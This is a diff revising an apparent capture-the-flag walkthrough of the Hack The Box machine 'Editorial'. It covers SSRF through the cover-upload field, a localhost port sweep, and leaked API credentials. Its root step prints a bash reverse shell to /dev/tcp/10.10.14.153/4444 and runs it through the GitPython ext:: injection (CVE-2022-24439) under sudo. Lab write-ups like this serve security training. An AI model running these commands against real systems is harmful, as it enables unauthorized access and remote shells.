@@ -22,49 +22,53 @@ Commands and output, one line per step. The reasoning, the dead ends, and why ea
 
 Commands are formatted from my May notes rather than a fresh replay. The cloning call in step 9 comes from the source captured in [0xdf's write-up](https://0xdf.gitlab.io/2024/10/19/htb-editorial.html#clone_changes); my notes did not preserve it.
 
-Target: `<target>`, attacker: `10.10.14.153`. My notes never recorded the target address.
+My notes never recorded the target address, and every `static/uploads/` path below is from my session. Set the first and regenerate the second as you go.
 
 ## Recon
 
 ```bash
-nmap -p- --min-rate 10000 -T4 -oA nmap/allports <target>
-nmap -sC -sV -p 22,80 -oA nmap/detail <target>
+TARGET=10.10.10.10        # replace with the box address for your session
+ATTACKER=10.10.14.153     # replace with your VPN address
+mkdir -p nmap
+nmap -p- --min-rate 10000 -T4 -oA nmap/allports "$TARGET"
+nmap -sC -sV -p 22,80 -oA nmap/detail "$TARGET"
 ```
 
 Ports 22 and 80 answer. My notes kept no scan output.
 
 ```bash
-echo "<target> editorial.htb" | sudo tee -a /etc/hosts
+echo "$TARGET editorial.htb" | sudo tee -a /etc/hosts
 ```
 
 The page has an upload field that takes a URL as well as a file.
 
 ## Foothold
 
-**1. Confirm the SSRF.** The cover URL lands at `/upload-cover`. `http://127.0.0.1` returns `200`.
+**1. Confirm the SSRF.** The cover URL lands at `/upload-cover`, in the `bookurl` field of the multipart body. `http://127.0.0.1` returns `200`.
 
 ```bash
 nc -lvnp 4444
 ```
 
-Point the cover URL at `10.10.14.153:4444` and the request arrives. `User-Agent: python-requests`.
+Point the cover URL at `$ATTACKER:4444` and the request arrives. `User-Agent: python-requests`.
 
-**2. Sweep localhost through it.** Every valid address returns `200` with the same placeholder JPEG, so filter on the body, not the status.
+**2. Sweep localhost through it.** A failed fetch and a successful one both come back `200` with a stored result, so filter on the body, not the status. This only probes HTTP, so it is not a full inventory of listening services.
 
 ```bash
 seq 1 65535 > ports.txt
 ```
 
-Send `/upload-cover` to Intruder, mark the port, load that list. Port 5000 comes back different:
+Send `/upload-cover` to Intruder, mark the port in `bookurl`, load that list. Port 5000 comes back different:
 
 ```text
 static/uploads/671fb455-fbb8-4d16-aa89-332b5ee00c9c
 ```
 
-**3. Read what 5000 returned.** The fetched body is stored as the "image", so pull the upload rather than the response.
+**3. Read what 5000 returned.** The fetched body is stored as the "image", so fetch the returned path off the site rather than reading the submission's response.
 
 ```bash
-cat 671fb455-fbb8-4d16-aa89-332b5ee00c9c | jq
+curl http://editorial.htb/static/uploads/671fb455-fbb8-4d16-aa89-332b5ee00c9c -o internal-api.json
+jq . internal-api.json
 ```
 
 ```text
@@ -76,7 +80,11 @@ cat 671fb455-fbb8-4d16-aa89-332b5ee00c9c | jq
 /api/latest/metadata
 ```
 
-**4. Request each endpoint through the same SSRF.** `authors` is the one that pays.
+**4. Request each endpoint through the same SSRF.** Two actions each time: submit the endpoint URL in `bookurl`, then fetch the new path that submission returns. `authors` is the one that pays.
+
+```text
+http://127.0.0.1:5000/api/latest/metadata/messages/authors
+```
 
 ```bash
 curl http://editorial.htb/static/uploads/ca85d32f-ac3f-41fe-a1b5-574bc2e46925 | jq
@@ -110,7 +118,7 @@ One commit is about downgrading the environment from production to development.
 **7. Read that commit.**
 
 ```bash
-git show <commit>
+git show COMMIT_HASH   # the production-to-development commit from git log
 ```
 
 ```text
@@ -146,10 +154,19 @@ GitPython is on 3.1.29, which is CVE-2022-24439.
 
 **10. Root.** Percent-space is git's escape for a literal space, so the payload reaches `sh -c` as one argument.
 
+On the box, as prod:
+
 ```bash
-echo "bash -i >& /dev/tcp/10.10.14.153/4444 0>&1" > /tmp/shell.sh
+echo "bash -i >& /dev/tcp/10.10.14.153/4444 0>&1" > /tmp/shell.sh   # your VPN address
+```
+
+On the attacking machine, in its own terminal:
+
+```bash
 nc -lvnp 4444
 ```
+
+Back on the box:
 
 ```bash
 sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
@@ -162,7 +179,7 @@ cat /root/root.txt
 ## Chain summary
 
 1. The cover-image field fetches a URL server-side, which is SSRF on `/upload-cover`, and an out-of-band hit confirms it.
-2. Every valid address returns 200 with the same JPEG, so the response body is the only usable oracle, and port 5000 answers differently.
+2. A failed fetch returns 200 with the same JPEG as a successful one, so the response body is the only usable oracle, and port 5000 answers differently.
 3. What 5000 returned is saved as the uploaded "image", and it is JSON listing the internal API's metadata endpoints.
 4. `/api/latest/metadata/messages/authors` carries `dev:dev080217_devAPI!@`.
 5. SSH as dev gives the user flag.
